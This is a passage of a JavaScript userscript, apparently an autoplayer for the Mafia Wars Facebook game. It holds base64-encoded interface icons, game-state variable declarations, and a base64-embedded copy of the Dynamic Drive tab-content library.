    'adhSwvG6XIbd+Xz8loOfOrIZeHUFvc4Ufr1Yyuc9Vg6XaGg/oKi9C5K5RBs98FH1+7CDod4H6Gsu5OsTJXBrnTStWopKuJPHneFk3OsSaduZxeSpHKauZ004y0WkePfN4qf7nTmMdhQw0l7I2KH72deTT2mpiTK7' +
    'iQ3ORGxWA7s8iVz4YCGHyqLwTVrZszOV2KiAJnH7l3rv1ICDkwdsvLQxG6ZWUFGVStpSM8mJJuIMRhboYojRG+CajiH3fNZkRCALDCMoQDUovhmtHJ6WiDnXbeNMY6y0shnbSgP2PCM1JQsoWp1AS2006elGmEng' +
    'wjs6qrJDCdeEI4R6QqTELhrOTE7AVZjOqVeSJIAYVlp0LDfrKC+IwGox4CyNwGTSw/VQzruD6HtEwY1pHf3dQRNCpzF45bJYLOmJHGmIg+kQsrLmkxyrZ40ljMykSPIyVQT4R8IVPzwuBXsbtfw8ouDsoP9pYY4P' +
    '315bGc+V7y280bCQQY+aznYVWx/V4tmk5plaDc83KXmyWcXFLhndTyjwdql52SZoqRPNomVrlP7SpcX9M6OL6XpBYn2Vnu+6g+G3QPhd+v8MAF8A48flbFut5GCrUjpTyY0x/2u5ZqG7q4XWF+NTex5XzbZVa7j5' +
    'o4n9di0H60P4pElO32YFHc55PGcJwlWhRakOp8Shwt0qNtyjRt9EkqTT0L+83mjS0qJw5EbwukvFa5tD6HxWw8yYkmUZoRLzIcj8AvfO6Qd8cWkZZvWIEFoUsjDGfgjnq2PzaF3uJ60dyJ4dEutCXvW/jvynGFyu' +
    '0ypOXv1UdvmPEfHtuV5xxtsmtmysFP+x8999db7DTUMcSAAAAABJRU5ErkJggg==' +
    '" />';

var healthIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsSAAALEgHS3X78AAAAB3RJTUUH1wUIFAADTJ17vgAAAJlJREFUOMvFk7ERwjAMRb84L2ENkhmgyh5p' +
    'WYAFmIExoPQUHiDF9xiiCkeMgu+cIr+z/P30ZZ8FG3rdL/a9Pl+f4vlCSgk5ZwzD9Cmq0h63cWUkaaoqLgAA5nllBwCpAV4C+bfZUoxRQNJ6RdLCJl6qcc0PecJOhWbnul4l2Z3geMDvHSwzHvcKjY4eQEop1hlA' +
    'lr/QdVpV8QYMB23AfeHdZQAAAABJRU5ErkJggg==' +
    '" />';

var healOnIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAAA4AAAAOCAMAAAAolt3jAAAABGdBTUEAALGPC/xhBQAAAwBQTFRFAH8OAX8PA4ARI5EvJJEvI5EwJJEwOJtDQqBMU6ldVKld/v7+/v//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAS0UhugAAAAlwSFlzAAAO' +
    'wgAADsIBFShKgAAAABl0RVh0U29mdHdhcmUAUGFpbnQuTkVUIHYzLjUuNUmK/OAAAABJSURBVBhXY2AAASYgADPAgJUbCJgRXB4eHm42rFwWFhYOkCwHkAE0hRvIhgJuJtK4jOzs7FwgoziBDEaIM3DbC3MkK8LR' +
    'cC8AAM5rBHBrmgyTAAAAAElFTkSuQmCC' +
    '" />';

var healOnHoldIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAAA4AAAAOCAMAAAAolt3jAAAABGdBTUEAALGPC/xhBQAAAwBQTFRF/2oA/2oB/2wD/n8j/n8k/os4/pFC/ZtU/v7+/v//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAnMpvDgAAAAlwSFlzAAAO' +
    'wgAADsIBFShKgAAAABl0RVh0U29mdHdhcmUAUGFpbnQuTkVUIHYzLjUuNUmK/OAAAABGSURBVBhXlY/BCgAgCEOrZer//3Czggjq0DttDOZMKShkiEE1gm3d3erVAmiRNgq2GPXCyp/NIqJRpRR5znjfZYpz5H6h' +
    'A1vyA1TohQLlAAAAAElFTkSuQmCC' +
    '" />';

var healOffIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAAA4AAAAOCAMAAAAolt3jAAAABGdBTUEAALGPC/xhBQAAAwBQTFRF/wAA/wEB/wMD/iQj/iQk/jg4/kNC/VRU/v7+/v//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeLKJyQAAAAlwSFlzAAAO' +
    'wgAADsIBFShKgAAAABl0RVh0U29mdHdhcmUAUGFpbnQuTkVUIHYzLjUuNUmK/OAAAABGSURBVBhXlY/BCgAgCEOrZer//3Czggjq0DttDOZMKShkiEE1gm3d3erVAmiRNgq2GPXCyp/NIqJRpRR5znjfZYpz5H6h' +
    'A1vyA1TohQLlAAAAAElFTkSuQmCC' +
    '" />';

var warningIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACgUlEQVR42pWST0gUURzHv29n/7S7rpuhlroW/kFdobQ8qBgdxItWB6NDkVAdukREWdShEr3YHyiicwQlJRJJEP2hOoVmapq1qbEuaWq7Cu6s6+7O' +
    'jLuz7zU7I1aYZXP5vWHm++Hzvu8R/OURJ15YGZWZJXePsNo/ZLUPYc9jS0ykQ0yWKKen2+1bG8T/AoS+tLf4J4UmeVFEaqaueX3Z8ZY1AxZGbm+e9y2OJttDFqoAeB+N2NMNRWm7mqbXBOAHb7YHJkMHHPnzYDEJ' +
    'YwNMsdA/yKi7deifgOCnqzu9I+E3jnyeuH0S5KiEApsE9wBYdpGlKrO+rWdVwMLHZl2El/pEPliWlRfAjYdALCbiTG0QnveA2Wbqs9qNFVkHn7A/Avjes0fH+4N3nBVz0FEB1zoAWQGcqwtCDkvoeUZQXLnh8JZj' +
    'b++tAPi7T9v8EwG3ycRvSncEwaR5NN8NKR2EcGmvABbX4duoEYJg86bnpBXmnugP/waYfXnkytd+//mSqilQYQosGsHlTgPMBuBkjWIcJ6CyDl3PzXCWp7XmN7ouLANmnzbkTrrmhrMcnnW2pO8AUwKUoMtDYOKA' +
    'sgxOMSCqBT/DYdxtlnJKHMV5p96Nq4CJttrO6aGx+m2VXk0nUREjGJll6rooRa8aJABMJhjoNsJRkPrIefHzfuLt2F3teuV5XVrpJWYrU7NY6rixnVPn9X3QwgokARLDBIO9RuYsz64mrtaSD8Kct7Rwx6KyHy3J' +
    'mFZNnFDVRBfVa2GasNBg7mEOJmvyIBlqyuOn3ZGUFVeK/TqJOjU7srRFICPTwBPf/ZokvSV5I8D9PJPlMFH7VN/p0poSDRKniIYCMz8A9QcpP1oZxJMAAAAASUVORK5CYIIK' +
    '" />';

var chickenIcon = '<img src="data:image/gif;base64,' +
    'R0lGODdhEAAQAMYAAAQCBKSKBHQCBEQ2FNTKDEwCBDQyTCQaBIyKvHxiDMzOzExOTBwaNCQCBFw+BPTmBHx6fPS+BDQmBExKfLy+BCQmJKSm3Hx+BAwOHMyaBKQCBExKHDwmDDQyZBwaHPTy9FxaXPz+BKSWBDQy' +
    'PPzKBGQCBJyavIRuDExOZCQmNCQWFGROBPzyBMQCBDw+ZBweHAwKDLSKBEwyBFQCBHxmBNze3FRSVDQCBGQ+DPzmBHx+fFxajLy+vJxyBBQSFLQCBBwaJPz+/PzWBJyazCwqRDw+dAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAAEAAQAAAHi4AAgoMAL4SHiDclM4iNGi0FjYcwLT+SkyUCMJeDJhUNE4Obgh6EFiguRRg6hoQeNUEQPgg7qzwKhzpBuhUGGx48t4QwNrsf' +
    'CyI5AwoKpYQ+IDogEiE5MT6XEgEPIUIRGT0Ho4QEFxQsJD0OOByNEisJJwkyHtiIIxYmLhISHkQdHeyJYkCwYMFBgQAAOw==' +
    '" />';

var hideIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQANU/AP////8zM/f39+3t7YCAgOXl5fX19fT09BkZGdPT0xUVFbS0tMvLy4eHh/9LS/v7++Hh4aAVEtvb2/j4+M9NTKQWFMcuLDw8PMMcGkpKSrq6uqQVFKkXFawYFsYcGqAUEqcmI5GRkf7+/qen' +
    'p6+vr/Pz87u7uwMDA/9ra/5ycmNjY2lpaf5HR8gdGs3Nzf+Hh8AbGtLS0vr6+psUEdjY2NnZ2dJOTP/b26MWE+fn56cWFL0bGKsXFa4YFp0UEgAAACH5BAEAAD8ALAAAAAAQABAAAAaYwJ9wSCwaA8ikkRhoeTyY' +
    'wFKoQNkoFpiUqFCNCoJwgbCTIhDCDOAhAAAMgwQhREgwSD+FyO2G1wYCEwYQDEIPfAIDEoAAMm8JQhp8BTk0A3wAAgVCDm4CBAQml3wHmz8BNwApAT08BAUHsS4EQw0ADQEdOjgRLGdFFwAxATwVID5bRSclAA4c' +
    'Gx8zyUULAC9JSFMrAAtTQkEAOw==' +
    '" />';

var bgTabImage =  '<img src="http://playerscripts.com/images/mwap_graphics/generaltabimage.png" />';

var checkedIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQAOYAAAAAAP///1pdWVlcWF5hXV1gXFteWi0xKz5CPCcpJmNnYVPwAFLuAFHsAFHqAFDoAE/mAE/kAE7iAEvYAEnUAEXIAETGAETEAEPCAELAAEG8AD+2AD60AD2yAD2wADusADuqADiiADOUAC+I' +
    'AC6EACyAACt+ACt8AD6vAS6DAS6CASyAASp5AUW5CEODIkJ3JVKRMVGOMFOSMlKQMVSUM1GLMl6TQ1mJP2WYSlJ0PzM1MYODg4KCgoGBgX9/f35+fn19fXt7e3p6enl5eXh4eHZ2dnV1dXNzc3Jycl9fX11dXVtb' +
    'W1paWllZWVhYWFdXV1ZWVlNTU09PTzk5OTQ0NDAwMC0tLSgoKCQkJCIiIiEhIR8fHx0dHRsbG////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAF4ALAAAAAAQABAAAAergF6Cg4SFhoeIiYqLSY1KS09PUFFSLi+ESTs8PT4/QUJDNBUYhEs8nUBBQ0QyFgsQHINPP56rRjAYDAwbI4M5' +
    'OEJERUczuQ0cKYQtEzZHSDEZDg4cKjqDGBAMKDc1Gg4PHSoEVoMaFAsPFxUQDx4rBUpXhB4VDQ4QER4lBktMWIQIQmiAIOGDCQFNnDzJQmiKAhEeQJwYoHASF0JUqhwgwSIBFi1buHDpIigQADs=' +
    '" />';

var unCheckedIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQAOYAAAAAAP///4ODg4KCgoGBgX9/f35+fn19fXt7e3p6enl5eXh4eHZ2dnV1dXNzc3JycnFxcXBwcG5ubm1tbWxsbGtra2lpaWhoaGdnZ2VlZWRkZGNjY2JiYmFhYWBgYF9fX11dXVxcXFtbW1pa' +
    'WllZWVhYWFdXV1ZWVlNTU1BQUE9PT05OTkpKSkhISEVFRUREREFBQT4+Pjo6Ojk5OTU1NTQ0NDMzMzAwMC0tLSoqKigoKCcnJyQkJCIiIiEhIR8fHx0dHRsbG////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAEIALAAAAAAQABAAAAeUgEKCg4SFhoeIiYqLH40gIiYmJygqKyyEHwIDBAUGCAkKDA4uhCIDnQcICgsNDxEwhCYGnqutEBIUMoQnnwui' +
    'txQVFzSEKaEOrhMUFhgZNoQrrRG4FhcZHB44hC3A1dcdHyA6hC8TFcwaGx6PIzyEMd7YICEkJSY9hDPXHh8hIvaTgBCqcQNHDh07ePj4AQRIEEGBAAA7' +
    '" />';

const noDelay = 0;              // No delay on commands
const minDelay = 1000;          // Minimum delay on commands
var running;                    // Is the autoplayer running?
var innerPageElt;               // The currently visible inner page
var appLayoutElt;               // The currently visible content page
var mastheadElt;                // Masthead content
var statsrowElt;                // statsrow content
var menubarElt;                 // menubar content
var popupfodderElt;             // popupfodder Element
var cash;                       // Cash array of values by city
var healthElt, health;          // Health DOM element and value
var maxHealthElt, maxHealth;    // Maximum health DOM element and value
var energyElt, energy;          // Energy DOM element and value
var maxEnergyElt, maxEnergy;    // Maximum energy DOM element and value
var staminaElt, stamina;        // Stamina DOM element and value
var maxStaminaElt, maxStamina;  // Maximum stamina DOM element and value
var levelElt, level;            // Level DOM element and value
var curAttack;                  // Current Attack stat value
var curDefense;                 // Current Defense stat value
var curAttackEquip;             // Current Attack equip value
var curDefenseEquip;            // Current Defense equip value
var prevAttackEquip;
var prevDefenseEquip;
var curExpElt, curExp;          // Experience DOM element and value
var lvlExpElt, lvlExp;          // Level up experience DOM element and value
var energyPackElt, energyPack;  // Is an energy pack waiting?
var ptsToNextLevel;             // Experience to next level up
var mafia;                      // Mafia size
var invites;                    // Number of mafia invitations
var stats;                      // Skill points
var city;                       // Current city (0=New York, 1=Cuba, 2=Moscow)
var skipStaminaSpend = false;   // Skip stamina actions for now?
var clickAction;                // Action being attempted with click simulation
var clickContext;               // Context for clickAction
var modificationTimer;          // Timer used to wait for content changes
var ajaxResultTimer;            // Timer for ajaxResultElt
var helpWar = false;            // Helping a friend's war?
var idle = true;                // Is the script currently idle?
var lastOpponent;               // Last opponent fought (object)
var suspendBank = false;        // Suspend banking for a while
var skipJobs = false;           // Skip doing jobs for a while
var jobOptimizeOn = false;      // Is job optimizing flag
var newStaminaMode;             // New stamina mode for random fighting
var checkOnWar;

//new_header = false ; // change the commented out line to disable all changes
new_header = xpathFirst('//div[@class="header_top_row"]') ? true : false; // checks for new header

if (!initialized && !checkInPublishPopup() && !checkLoadIframe() &&
    (/inthemafia/.test(document.referrer) ||
     /facebook\.mafiawars\.com/.test(window.location.href))) {
  var tabURI =
    "Ly8qKiBUYWIgQ29udGVudCBzY3JpcHQgdjIuMC0gqSBEeW5hbWljIERyaXZlIERIVE1MIGNvZGUgbGlicmFyeSAoaHR0cDovL3d3dy5keW5hbWljZHJpdmUuY29tKQ0KLy8qKiBVcGRhdGVkIE9jdCA3dGgsIDA3" +
    "IHRvIHZlcnNpb24gMi4wLiBDb250YWlucyBudW1lcm91cyBpbXByb3ZlbWVudHM6DQovLyAgIC1BZGRlZCBBdXRvIE1vZGU6IFNjcmlwdCBhdXRvIHJvdGF0ZXMgdGhlIHRhYnMgYmFzZWQgb24gYW4gaW50ZXJ2" +
    "YWwsIHVudGlsIGEgdGFiIGlzIGV4cGxpY2l0bHkgc2VsZWN0ZWQNCi8vICAgLUFiaWxpdHkgdG8gZXhwYW5kL2NvbnRyYWN0IGFyYml0cmFyeSBESVZzIG9uIHRoZSBwYWdlIGFzIHRoZSB0YWJiZWQgY29udGVu" +
    "dCBpcyBleHBhbmRlZC8gY29udHJhY3RlZA0KLy8gICAtQWJpbGl0eSB0byBkeW5hbWljYWxseSBzZWxlY3QgYSB0YWIgZWl0aGVyIGJhc2VkIG9uIGl0cyBwb3NpdGlvbiB3aXRoaW4gaXRzIHBlZXJzLCBvciBp" +
    "dHMgSUQgYXR0cmlidXRlIChnaXZlIHRoZSB0YXJnZXQgdGFiIG9uZSAxc3QpDQovLyAgIC1BYmlsaXR5IHRvIHNldCB3aGVyZSB0aGUgQ1NTIGNsYXNzbmFtZSAic2VsZWN0ZWQiIGdldCBhc3NpZ25lZC0gZWl0" +
    "aGVyIHRvIHRoZSB0YXJnZXQgdGFiJ3MgbGluayAoIkEiKSwgb3IgaXRzIHBhcmVudCBjb250YWluZXINCi8vKiogVXBkYXRlZCBGZWIgMTh0aCwgMDggdG8gdmVyc2lvbiAyLjE6IEFkZHMgYSAidGFiaW5zdGFu" +
    "Y2UuY3ljbGVpdChkaXIpIiBtZXRob2QgdG8gY3ljbGUgZm9yd2FyZCBvciBiYWNrd2FyZCBiZXR3ZWVuIHRhYnMgZHluYW1pY2FsbHkNCi8vKiogVXBkYXRlZCBBcHJpbCA4dGgsIDA4IHRvIHZlcnNpb24gMi4y" +
    "OiBBZGRzIHN1cHBvcnQgZm9yIGV4cGFuZGluZyBhIHRhYiB1c2luZyBhIFVSTCBwYXJhbWV0ZXIgKGllOiBodHRwOi8vbXlzaXRlLmNvbS90YWJjb250ZW50Lmh0bT90YWJpbnRlcmZhY2VpZD0wKSANCg0KLy8v" +
    "L05PIE5FRUQgVE8gRURJVCBCRUxPVy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLw0KDQpmdW5jdGlvbiBkZHRhYmNvbnRlbnQodGFiaW50ZXJmYWNlaWQpew0KCXRoaXMudGFiaW50ZXJmYWNlaWQ9dGFiaW50ZXJm" +
    "YWNlaWQgLy9JRCBvZiBUYWIgTWVudSBtYWluIGNvbnRhaW5lcg0KCXRoaXMudGFicz1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCh0YWJpbnRlcmZhY2VpZCkuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImEiKSAvL0dl" +
    "dCBhbGwgdGFiIGxpbmtzIHdpdGhpbiBjb250YWluZXINCgl0aGlzLmVuYWJsZXRhYnBlcnNpc3RlbmNlPXRydWUNCgl0aGlzLmhvdHRhYnNwb3NpdGlvbnM9W10gLy9BcnJheSB0byBzdG9yZSBwb3NpdGlvbiBv" +
    "ZiB0YWJzIHRoYXQgaGF2ZSBhICJyZWwiIGF0dHIgZGVmaW5lZCwgcmVsYXRpdmUgdG8gYWxsIHRhYiBsaW5rcywgd2l0aGluIGNvbnRhaW5lcg0KCXRoaXMuY3VycmVudFRhYkluZGV4PTAgLy9JbmRleCBvZiBj" +
    "dXJyZW50bHkgc2VsZWN0ZWQgaG90IHRhYiAodGFiIHdpdGggc3ViIGNvbnRlbnQpIHdpdGhpbiBob3R0YWJzcG9zaXRpb25zW10gYXJyYXkNCgl0aGlzLnN1YmNvbnRlbnRpZHM9W10gLy9BcnJheSB0byBzdG9y" +
    "ZSBpZHMgb2YgdGhlIHN1YiBjb250ZW50cyAoInJlbCIgYXR0ciB2YWx1ZXMpDQoJdGhpcy5yZXZjb250ZW50aWRzPVtdIC8vQXJyYXkgdG8gc3RvcmUgaWRzIG9mIGFyYml0cmFyeSBjb250ZW50cyB0byBleHBh" +
    "bmQvY29udGFjdCBhcyB3ZWxsICgicmV2IiBhdHRyIHZhbHVlcykNCgl0aGlzLnNlbGVjdGVkQ2xhc3NUYXJnZXQ9ImxpbmsiIC8va2V5d29yZCB0byBpbmRpY2F0ZSB3aGljaCB0YXJnZXQgZWxlbWVudCB0byBh" +
    "c3NpZ24gInNlbGVjdGVkIiBDU1MgY2xhc3MgKCJsaW5rcGFyZW50IiBvciAibGluayIpDQp9DQoNCmRkdGFiY29udGVudC5nZXRDb29raWU9ZnVuY3Rpb24oTmFtZSl7IA0KCXZhciByZT1uZXcgUmVnRXhwKE5h" +
    "bWUrIj1bXjtdKyIsICJpIik7IC8vY29uc3RydWN0IFJFIHRvIHNlYXJjaCBmb3IgdGFyZ2V0IG5hbWUvdmFsdWUgcGFpcg0KCWlmIChkb2N1bWVudC5jb29raWUubWF0Y2gocmUpKSAvL2lmIGNvb2tpZSBmb3Vu" +
    "ZA0KCQlyZXR1cm4gZG9jdW1lbnQuY29va2llLm1hdGNoKHJlKVswXS5zcGxpdCgiPSIpWzFdIC8vcmV0dXJuIGl0cyB2YWx1ZQ0KCXJldHVybiAiIg0KfQ0KDQpkZHRhYmNvbnRlbnQuc2V0Q29va2llPWZ1bmN0" +
    "aW9uKG5hbWUsIHZhbHVlKXsNCglkb2N1bWVudC5jb29raWUgPSBuYW1lKyI9Iit2YWx1ZSsiO3BhdGg9LyIgLy9jb29raWUgdmFsdWUgaXMgZG9tYWluIHdpZGUgKHBhdGg9LykNCn0NCg0KZGR0YWJjb250ZW50" +
    "LnByb3RvdHlwZT17DQoNCglleHBhbmRpdDpmdW5jdGlvbih0YWJpZF9vcl9wb3NpdGlvbil7IC8vUFVCTElDIGZ1bmN0aW9uIHRvIHNlbGVjdCBhIHRhYiBlaXRoZXIgYnkgaXRzIElEIG9yIHBvc2l0aW9uKGlu" +
    "dCkgd2l0aGluIGl0cyBwZWVycw0KCQl0aGlzLmNhbmNlbGF1dG9ydW4oKSAvL3N0b3AgYXV0byBjeWNsaW5nIG9mIHRhYnMgKGlmIHJ1bm5pbmcpDQoJCXZhciB0YWJyZWY9IiINCgkJdHJ5ew0KCQkJaWYgKHR5" +
    "cGVvZiB0YWJpZF9vcl9wb3NpdGlvbj09InN0cmluZyIgJiYgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQodGFiaWRfb3JfcG9zaXRpb24pLmdldEF0dHJpYnV0ZSgicmVsIikpIC8vaWYgc3BlY2lmaWVkIHRhYiBj" +
    "b250YWlucyAicmVsIiBhdHRyDQoJCQkJdGFicmVmPWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKHRhYmlkX29yX3Bvc2l0aW9uKQ0KCQkJZWxzZSBpZiAocGFyc2VJbnQodGFiaWRfb3JfcG9zaXRpb24pIT1OYU4g" +
    "JiYgdGhpcy50YWJzW3RhYmlkX29yX3Bvc2l0aW9uXS5nZXRBdHRyaWJ1dGUoInJlbCIpKSAvL2lmIHNwZWNpZmllZCB0YWIgY29udGFpbnMgInJlbCIgYXR0cg0KCQkJCXRhYnJlZj10aGlzLnRhYnNbdGFiaWRf" +
    "b3JfcG9zaXRpb25dDQoJCX0NCgkJY2F0Y2goZXJyKXthbGVydCgiSW52YWxpZCBUYWIgSUQgb3IgcG9zaXRpb24gZW50ZXJlZCEiKX0NCgkJaWYgKHRhYnJlZiE9IiIpIC8vaWYgYSB2YWxpZCB0YWIgaXMgZm91" +
    "bmQgYmFzZWQgb24gZnVuY3Rpb24gcGFyYW1ldGVyDQoJCQl0aGlzLmV4cGFuZHRhYih0YWJyZWYpIC8vZXhwYW5kIHRoaXMgdGFiDQoJfSwNCg0KCWN5Y2xlaXQ6ZnVuY3Rpb24oZGlyLCBhdXRvcnVuKXsgLy9Q" +
    "VUJMSUMgZnVuY3Rpb24gdG8gbW92ZSBmb3dhcmQgb3IgYmFja3dhcmRzIHRocm91Z2ggZWFjaCBob3QgdGFiICh0YWJpbnN0YW5jZS5jeWNsZWl0KCdmb3dhcmQvYmFjaycpICkNCgkJaWYgKGRpcj09Im5leHQi" +
    "KXsNCgkJCXZhciBjdXJyZW50VGFiSW5kZXg9KHRoaXMuY3VycmVudFRhYkluZGV4PHRoaXMuaG90dGFic3Bvc2l0aW9ucy5sZW5ndGgtMSk/IHRoaXMuY3VycmVudFRhYkluZGV4KzEgOiAwDQoJCX0NCgkJZWxz" +
    "ZSBpZiAoZGlyPT0icHJldiIpew0KCQkJdmFyIGN1cnJlbnRUYWJJbmRleD0odGhpcy5jdXJyZW50VGFiSW5kZXg+MCk/IHRoaXMuY3VycmVudFRhYkluZGV4LTEgOiB0aGlzLmhvdHRhYnNwb3NpdGlvbnMubGVu" +
